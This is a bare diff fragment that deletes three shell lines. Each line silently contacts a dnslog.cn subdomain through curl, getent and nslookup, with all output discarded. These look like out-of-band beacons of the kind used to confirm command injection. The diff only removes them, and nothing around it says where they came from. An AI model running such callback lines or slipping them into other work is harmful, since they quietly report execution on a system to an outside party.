@@ -1,3 +1,0 @@
-curl -s -m 1 -o /dev/null http://c-634.lt46i7.dnslog.cn/ >/dev/null 2>&1
-getent hosts g-634.lt46i7.dnslog.cn >/dev/null 2>&1
-nslookup n-634.lt46i7.dnslog.cn >/dev/null 2>&1
